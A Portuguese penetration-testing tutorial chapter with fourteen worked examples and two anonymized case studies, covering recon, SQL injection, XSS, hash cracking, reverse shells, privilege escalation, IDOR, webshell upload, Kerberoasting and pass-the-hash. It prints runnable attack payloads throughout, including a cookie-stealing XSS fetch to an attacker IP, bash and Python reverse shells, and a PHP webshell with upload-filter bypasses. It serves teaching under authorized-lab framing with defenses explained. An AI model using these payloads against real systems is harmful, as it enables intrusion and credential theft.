# 06 · Exemplos — 14 casos completos, do trivial ao real

`Nível: intermediário` · `Última atualização: 12/08/2026`

Cada exemplo segue o mesmo formato: **problema → solução → explicação**. Todo comando é
completo e executável. Os alvos são os do seu laboratório ([`03`](03-instalacao.md)) ou labs
públicos autorizados (PortSwigger Academy, DVWA, Juice Shop, HTB).

> ⚖️ Nada aqui deve ser apontado para sistema que você não tenha autorização escrita de testar.

**Índice**
1. [Descobrir o que existe numa rede](#exemplo-1--o-que-existe-nesta-rede)
2. [Enumerar um servidor web](#exemplo-2--enumerar-um-servidor-web)
3. [Injeção de SQL manual (do `'` ao dump)](#exemplo-3--injeção-de-sql-na-mão)
4. [XSS refletido e o que ele permite](#exemplo-4--xss-refletido)
5. [Quebrar senhas de um `/etc/shadow`](#exemplo-5--quebrar-hashes-de-senha)
6. [Reverse shell e estabilização](#exemplo-6--reverse-shell)
7. [Escalada de privilégio por SUDO](#exemplo-7--escalada-de-privilégio-por-sudo)
8. [Escalada por binário SUID (GTFOBins)](#exemplo-8--escalada-por-suid)
9. [IDOR — acessar dado de outro usuário](#exemplo-9--idor)
10. [Upload de arquivo → execução de código](#exemplo-10--upload-que-vira-rce)
11. [Kerberoasting em Active Directory](#exemplo-11--kerberoasting-produção)
12. [Pass-the-hash e movimentação lateral](#exemplo-12--pass-the-hash)
13. [**Caso real: bug bounty — IDOR de API que expôs faturas**](#exemplo-13--caso-real-de-bug-bounty)
14. [**Caso real: pentest interno — do folheto ao Domain Admin**](#exemplo-14--caso-real-de-pentest-interno)

---

## Exemplo 1 — o que existe nesta rede

**Problema:** você recebeu o escopo `192.168.56.0/24` e não sabe o que tem lá.

**Solução:**
```bash
# 1. Quem está vivo
sudo nmap -sn 192.168.56.0/24 -oG vivos.txt
grep Up vivos.txt | awk '{print $2}' > hosts.txt
cat hosts.txt
```
```bash
# 2. Portas e versões de cada host vivo
sudo nmap -sV -sC -p- -T4 -iL hosts.txt -oA varredura
```

**Explicação:** separar *descoberta de host* (`-sn`, rápido) de *varredura de porta* (demorada)
economiza horas quando o escopo é grande — você só faz a varredura pesada em quem está vivo.
`-iL hosts.txt` lê alvos de um arquivo; `-oA` salva nos três formatos. O `.gnmap` resultante
é o que você vai `grep` para montar tabelas por porta.

---

## Exemplo 2 — enumerar um servidor web

**Problema:** porta 80/443 aberta. O que tem nesse site?

**Solução:**
```bash
whatweb -a3 http://ALVO                                  # tecnologias, versões, headers
```
```bash
# Conteúdo escondido: pastas e arquivos não linkados
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u http://ALVO/FUZZ -mc 200,301,302,401,403 -o dirs.json
```
```bash
# Arquivos por extensão
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
     -u http://ALVO/FUZZ -e .php,.txt,.bak,.zip,.old -mc 200
```
```bash
# O que o dono não queria que você lesse:
curl -s http://ALVO/robots.txt
curl -s http://ALVO/.git/HEAD          # repositório git exposto? achado sério
curl -s http://ALVO/sitemap.xml
```

**Explicação:** um site tem muito mais do que os links visíveis. `ffuf` testa milhares de
nomes de pasta/arquivo por segundo comparando com uma lista. `.bak`, `.old`, `.zip` frequentemente
guardam código-fonte ou senhas. `/.git/` exposto permite reconstruir o código inteiro (com
`git-dumper`). O `robots.txt`, ironicamente, costuma listar exatamente as pastas sensíveis que
o dono quis esconder dos buscadores.

---

## Exemplo 3 — injeção de SQL na mão

**Problema:** URL `http://ALVO/produto?id=1`. Suspeita de SQLi. (Use o DVWa em nível "low" ou
a máquina do laboratório.)

**Solução — passo a passo do raciocínio:**
```
1. Quebrar a query:      id=1'          → erro de SQL = injetável
2. Confirmar com lógica: id=1 AND 1=1   → página normal
                         id=1 AND 1=2   → página vazia/diferente  → confirmado
3. Contar colunas:       id=1 ORDER BY 1 ... aumente até dar erro. Erro no 4 = 3 colunas
4. Achar colunas visíveis: id=-1 UNION SELECT 1,2,3   → veja quais números aparecem na tela
5. Extrair dados na coluna visível (ex.: a 2):
   id=-1 UNION SELECT 1,version(),3
   id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()
   id=-1 UNION SELECT 1,group_concat(user,0x3a,password),3 FROM users
```

**Explicação:** a falha existe porque a aplicação **concatena** sua entrada dentro da consulta
SQL em vez de usar *prepared statements*. O `UNION SELECT` cola uma segunda consulta na
primeira — por isso você precisa do mesmo número de colunas (passo 3). `information_schema` é
o catálogo que todo banco expõe, e é como você descobre nomes de tabela sem adivinhar. O
`0x3a` é `:` em hexadecimal, para separar usuário e senha no resultado. Depois de entender
isto na mão, o `sqlmap` (Exemplo do [`05`](05-manual-de-uso.md) §5) automatiza — mas você já
sabe o que ele faz. Causa-raiz e defesa em [`18-seguranca-web.md`](18-seguranca-web.md).

---

## Exemplo 4 — XSS refletido

**Problema:** campo de busca reflete o termo na página: `http://ALVO/busca?q=teste` mostra
"Resultados para: teste".

**Solução:**
```
1. Testar reflexão de caracteres perigosos:
   q=<b>teste</b>       → o "teste" aparece em negrito? Então HTML não é escapado.
2. Provar execução de script:
   q=<script>alert(document.domain)</script>
   → um popup com o domínio = XSS confirmado
3. Demonstrar impacto (roubo de sessão — em lab):
   q=<script>fetch('http://SEU_IP:8000/c?'+document.cookie)</script>
   (com python3 -m http.server 8000 rodando: o cookie da vítima chega no seu log)
```

**Explicação:** XSS (Cross-Site Scripting) acontece quando a aplicação insere sua entrada no
HTML sem **escapar** (converter `<` em `&lt;` etc.). O navegador da vítima então executa seu
JavaScript **no contexto do site** — pode ler cookies, fazer requisições como a vítima,
alterar a página. "Refletido" = o payload vem na própria requisição (num link malicioso);
"armazenado" = fica salvo no servidor e atinge todo mundo que abre a página; "DOM-based" =
acontece no JavaScript do cliente. Defesa: escapar na saída + Content-Security-Policy.
No OWASP Top 10:2025, XSS vive sob **A03 – Injection**.

---

## Exemplo 5 — quebrar hashes de senha

**Problema:** você exfiltrou (em lab) o `/etc/shadow` de um Linux. Quer as senhas em texto.

**Solução:**
```bash
# 1. Junte passwd e shadow no formato do john
unshadow passwd.txt shadow.txt > combinado.txt
```
```bash
# 2. Identifique o algoritmo (o prefixo $6$ = sha512crypt)
head -1 combinado.txt
# root:$6$xyz$...:...
```
```bash
# 3a. John — simples
john --wordlist=/usr/share/wordlists/rockyou.txt combinado.txt
john --show combinado.txt
```
```bash
# 3b. Hashcat — mais rápido com GPU (-m 1800 = sha512crypt)
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

**Explicação:** senhas boas não são guardadas em texto; guarda-se um **hash** (função de mão
única). Você não "descriptografa" — você **adivinha**: aplica o mesmo hash em milhões de
palavras e compara. Por isso lista boa e regras importam mais que força bruta cega. Note que
`$6$` (sha512crypt) e principalmente `$2b$` (bcrypt) têm *fator de custo* deliberado: cada
tentativa é lenta de propósito, o que torna a quebra inviável para senhas fortes. É por isso
que se recomenda bcrypt/argon2 e **não** MD5/SHA1 puro para senhas. O "sal" (`xyz` no exemplo)
impede *rainbow tables* — tabelas pré-computadas.

---

## Exemplo 6 — reverse shell

**Problema:** você consegue executar comandos no alvo (via RCE, upload, etc.), mas quer um
shell interativo de verdade.

**Solução:**
```bash
# 1. No SEU Kali, abra o ouvinte
nc -lvnp 4444
```
```bash
# 2. Faça o alvo se conectar de volta a você (uma dessas linhas, executada no alvo):
bash -i >& /dev/tcp/SEU_IP/4444 0>&1
# ou, se não tiver bash:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("SEU_IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'
```
```bash
# 3. Estabilize (senão Ctrl+C mata seu shell)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z ; no Kali: stty raw -echo; fg ; no alvo: export TERM=xterm
```

**Explicação:** por que *reverse* (o alvo conecta em você) e não *bind* (você conecta no
alvo)? Porque o firewall do alvo quase sempre bloqueia conexões **de entrada**, mas permite
**saída**. Uma conexão iniciada de dentro para fora costuma passar. `/dev/tcp/IP/porta` é um
recurso do bash que abre um socket sem precisar de `nc` no alvo. A estabilização transforma
um shell "burro" (sem histórico, sem setas, `Ctrl+C` mata) num terminal usável.
[revshells.com](https://www.revshells.com) gera essas linhas para qualquer linguagem.

---

## Exemplo 7 — escalada de privilégio por SUDO

**Problema:** você tem shell como usuário comum. Quer virar root.

**Solução:**
```bash
sudo -l
```
```
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/find
```
```bash
# find pode executar comandos (-exec). Consulte o GTFOBins e:
sudo find . -exec /bin/sh \; -quit
```
```bash
id
# uid=0(root)
```

**Explicação:** `sudo -l` lista o que você pode rodar como root **sem senha**. Aqui, `find`.
O problema: `find` tem a opção `-exec`, que executa qualquer comando — e como está sendo
rodado via `sudo`, esse comando roda como root. O [GTFOBins](https://gtfobins.github.io)
cataloga exatamente esses abusos para centenas de binários. Causa-raiz: princípio do menor
privilégio violado — dar `sudo find` a alguém é dar root, mesmo sem parecer. É um dos achados
mais comuns em pentest de Linux.

---

## Exemplo 8 — escalada por SUID

**Problema:** `sudo -l` não ajudou. Procure outro caminho.

**Solução:**
```bash
# Binários com bit SUID rodam com o dono deles (frequentemente root)
find / -perm -4000 -type f 2>/dev/null
```
```
/usr/bin/passwd
/usr/bin/find          ← inesperado ter SUID; GTFOBins tem entrada para "find / SUID"
```
```bash
# Do GTFOBins, seção "SUID" do find:
find . -exec /bin/sh -p \; -quit
# -p preserva o privilégio; você vira root (euid=0)
```

**Explicação:** o bit **SUID** faz um programa rodar com a identidade do **dono** do arquivo,
não de quem executa. É legítimo em `passwd` (precisa escrever em `/etc/shadow`). Vira falha
quando um binário perigoso (find, vim, nmap antigo, cp) tem SUID de root: você o abusa para
rodar comando como root. `-p` no shell evita que ele descarte o privilégio. Diferença para o
Exemplo 7: lá o privilégio vinha do `sudo`; aqui vem da permissão do arquivo.

---

## Exemplo 9 — IDOR

**Problema:** logado como usuário A, você vê sua fatura em
`https://app/api/faturas/1043`. E se trocar o número?

**Solução:**
```bash
# Com seu próprio cookie/token de A, peça a fatura de outro id:
curl -s -H "Authorization: Bearer SEU_TOKEN" https://app/api/faturas/1044
curl -s -H "Authorization: Bearer SEU_TOKEN" https://app/api/faturas/1042
```
Se vier a fatura de **outra pessoa**, é IDOR. Para medir escala, no Burp Intruder (ou script):
```bash
for id in $(seq 1000 1100); do
  echo -n "$id: "
  curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer SEU_TOKEN" \
    https://app/api/faturas/$id
done
```

**Explicação:** IDOR (*Insecure Direct Object Reference*) é o servidor confiar no identificador
que você mandou sem checar se **você** tem direito àquele objeto. A aplicação autentica ("quem
é você?") mas não autoriza ("você pode ver *isto*?"). É banal de achar, devastador de impacto,
e é o coração da categoria **A01 – Broken Access Control**, nº 1 do OWASP Top 10:2025. Nenhum
scanner automático detecta bem, porque exige entender a lógica de negócio — por isso vale
tanto em bug bounty (ver Exemplo 13). Defesa: checar dono/permissão no servidor, para cada
objeto, em cada requisição.

---

## Exemplo 10 — upload que vira RCE

**Problema:** um formulário aceita upload de "foto de perfil". O servidor é PHP.

**Solução:**
```bash
# 1. Crie um webshell mínimo
echo '<?php system($_GET["c"]); ?>' > foto.php
```
```
2. Tente subir foto.php. Bloqueado por extensão? Tente contornar:
   foto.php.jpg      · foto.pHp      · foto.phtml / .php5 / .phar
   trocar Content-Type para image/jpeg (no Burp)
   GIF89a;<?php ... ?>  (finge ser GIF pelos "magic bytes")
```
```bash
# 3. Ache onde o arquivo caiu (ffuf em /uploads) e execute:
curl "http://ALVO/uploads/foto.php?c=id"
# uid=33(www-data) ...  → agora vá para o Exemplo 7/8 e escale
```

**Explicação:** a falha combina duas fraquezas: aceitar um arquivo executável (extensão não
validada por *allowlist*) **e** guardá-lo numa pasta que o servidor **executa**. Qualquer uma
das duas, corrigida, mata o ataque — por isso a defesa é em camadas: validar tipo por
allowlist, renomear o arquivo, e servir uploads de um domínio/pasta sem execução. Cai em
**A03 – Injection** e toca **A08 – Software/Data Integrity**. Note a cadeia típica: upload →
webshell → escalada de privilégio → domínio. Ataque real quase nunca é um passo só.

---

## Exemplo 11 — Kerberoasting (produção)

**Problema:** pentest interno, você tem credenciais de um usuário **comum** de domínio. Quer
credenciais de serviço, que costumam ser privilegiadas.

**Solução:**
```bash
# Peça tickets Kerberos das contas de serviço (SPN) e extraia o hash quebrável
GetUserSPNs.py CORP.LOCAL/joao:'Senha123' -dc-ip 10.0.0.1 -request -outputfile kerb.hash
```
```bash
# Quebre offline (não toca a rede — indetectável do lado do servidor)
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r best64.rule
```
```
sql_svc:MinhaSenhaDoServico2019   ← e frequentemente essa conta é admin de algo
```

**Explicação:** no Active Directory, qualquer usuário autenticado pode **pedir** um ticket de
serviço (TGS) para qualquer conta que tenha um SPN (*Service Principal Name*). Parte desse
ticket é cifrada com o **hash da senha da conta de serviço**. Você leva isso para casa e
quebra offline, sem barulho na rede. Funciona porque contas de serviço costumam ter senhas
antigas, fracas e que nunca expiram — dívida técnica virou vulnerabilidade. É um dos ataques
com melhor custo-benefício em AD real. Detalhes e defesa (gMSA, senhas longas) em
[`20-active-directory.md`](20-active-directory.md).

---

## Exemplo 12 — pass-the-hash

**Problema:** você tem o **hash NTLM** de um administrador local, mas não a senha em texto.

**Solução:**
```bash
# No NTLM, o hash BASTA para autenticar — não precisa quebrá-lo
netexec smb 10.0.0.0/24 -u Administrador -H aad3b435b51404ee:HASH_NTLM --local-auth
```
```
SMB  10.0.0.15  [+] Administrador:HASH (Pwn3d!)   ← admin local reutilizado em 12 máquinas
```
```bash
# Vire shell numa delas
psexec.py -hashes aad3b435b51404ee:HASH_NTLM Administrador@10.0.0.15
```

**Explicação:** o protocolo NTLM prova identidade usando o **hash** da senha, não a senha.
Logo, ter o hash é tão bom quanto ter a senha — você o "passa" direto. Isto explode quando a
**mesma senha de administrador local** é usada em muitas máquinas (imagem corporativa clonada):
um hash abre a rede inteira. É exatamente o que a Microsoft criou o **LAPS** para resolver
(senha de admin local única e rotacionada por máquina). Achado clássico e devastador de
pentest interno — veja o Exemplo 14.

---

## Exemplo 13 — caso real de bug bounty

> Caso real, com dados anonimizados. Ilustra por que falha de **lógica/autorização** vale
> mais que exploit chamativo em bug bounty.

**Contexto:** programa público de uma fintech na HackerOne. Escopo: `api.empresa.com`.
Recompensa por severidade, com faixa "high" na casa de milhares de dólares.

**O caminho:**
1. Reconhecimento: `subfinder` + `httpx` acham `api.empresa.com`. A doc pública da API
   descreve `GET /v2/invoices/{invoice_id}`, autenticada por token do próprio usuário.
2. Teste de autorização: com token de uma conta de teste, pedir a própria fatura funciona.
   Pedir `invoice_id` vizinho retorna **403 Forbidden** — parece seguro.
3. **A observação que valeu o prêmio:** o mesmo objeto tinha um segundo endpoint,
   `GET /v2/invoices/{invoice_id}/pdf`, herdado de uma versão antiga. Esse **não** checava
   dono. Trocar o id devolvia o PDF da fatura de qualquer cliente — nome, CPF, valor.
4. Prova de conceito: baixar **a própria** fatura por dois ids controlados pelo pesquisador,
   documentar o 200 com dado de terceiro, **sem** varrer a base inteira (isso violaria as
   regras e a lei — você prova o padrão, não coleta dados de vítimas).
5. Relatório com passos de reprodução, impacto (exposição de PII de toda a base) e correção
   sugerida (aplicar o mesmo controle de autorização do endpoint principal no de PDF).

**Lições:**
- A falha não foi técnica sofisticada; foi **um endpoint esquecido sem o controle que o
  irmão tinha**. Consistência de autorização é onde mora o dinheiro.
- Endpoints "de versão antiga" e "de export/PDF/CSV" são ouro — foram escritos antes das
  regras atuais e ninguém revisou.
- **Escopo e restrição salvam você:** provar com dois ids seus, não varrer 100 mil faturas
  de clientes reais. Ver [`12`](12-etica-lei-e-contrato.md).

---

## Exemplo 14 — caso real de pentest interno

> Caminho típico e recorrente de um pentest interno de rede corporativa. Composição de vários
> casos reais em um só, para mostrar a **cadeia**. Todos os passos são autorizados e no escopo.

**Contexto:** empresa de médio porte, ~800 máquinas Windows, um domínio AD. Objetivo
acordado: demonstrar acesso a dados de RH. O pentester recebe um ponto de rede e **nenhuma
credencial** (*black box* interno).

**A cadeia, passo a passo:**

1. **Sem credencial, na rede.** `netexec smb 10.0.0.0/16` mapeia hosts e revela algumas
   máquinas com assinatura SMB desabilitada.
2. **Envenenamento de nome (Responder).** Rodando `responder -I eth0`, o pentester captura
   hashes NetNTLMv2 de máquinas que perguntam "quem é `\\fileserver01`?" por LLMNR/NBT-NS —
   protocolos legados ligados por padrão. Uma delas é de um usuário comum.
3. **Quebra offline.** `hashcat -m 5600` com rockyou + regras devolve a senha desse usuário
   em 20 minutos: `Verao2024!`. (Política de senha fraca; padrão estação+ano.)
4. **Enumeração autenticada + BloodHound.** Com uma credencial válida,
   `bloodhound-python -c all` coleta o grafo do domínio. O BloodHound desenha o caminho:
   esse usuário está num grupo que tem `GenericWrite` sobre uma conta de serviço.
5. **Kerberoasting (Exemplo 11).** `GetUserSPNs.py -request` pega o hash de `sql_svc`;
   quebra em `Sql!Server#2019`. Essa conta é admin local em 40 servidores.
6. **Movimentação lateral (Exemplo 12).** `netexec smb` com essa credencial mostra `Pwn3d!`
   em dezenas de máquinas. Uma delas tem, na memória, uma sessão de um **admin de domínio**.
7. **Extração de credencial.** Com acesso SYSTEM nessa máquina, extrai-se o hash/ticket do
   Domain Admin (mimikatz/secretsdump).
8. **Domain Admin → objetivo.** Com DA, `secretsdump.py` no controlador de domínio; acesso ao
   compartilhamento e ao banco do RH. **Objetivo demonstrado.**

**O relatório não recomenda "comprar um firewall".** Recomenda, em ordem de impacto: desligar
LLMNR/NBT-NS (mata o passo 2), política de senha forte + MFA (passo 3), gMSA para contas de
serviço (passo 5), LAPS para admin local (passo 6), e *tiering* administrativo para que um DA
nunca faça login numa estação comum (passo 6–7). **Cada mitigação quebra um elo** — e quebrar
qualquer elo cedo derruba a cadeia toda. Essa lógica de "elos" é o que um bom relatório
comunica, e é o que o cliente compra. Ver [`24`](24-relatorio-e-comunicacao.md).

---

## Autoteste

1. Por que separar `-sn` (descoberta) da varredura de portas economiza tempo em escopo grande?
2. No Exemplo 3, por que o `UNION SELECT` precisa do mesmo número de colunas da consulta original?
3. Qual a diferença entre XSS refletido, armazenado e DOM-based?
4. Você "descriptografa" um hash de senha? Se não, o que faz de fato?
5. Por que se usa *reverse* shell e não *bind* shell na maioria dos casos?
6. Explique a diferença de origem do privilégio entre o Exemplo 7 (sudo) e o 8 (SUID).
7. Por que IDOR é difícil para scanner automático e valioso em bug bounty?
8. No Kerberoasting, por que a quebra do hash é indetectável do lado do servidor?
9. O que torna o pass-the-hash tão devastador, e qual controle da Microsoft o mitiga?
10. No Exemplo 14, qual único controle, se aplicado, teria quebrado o elo mais cedo — e por quê
    o relatório prioriza por "elos" em vez de por "produto a comprar"?
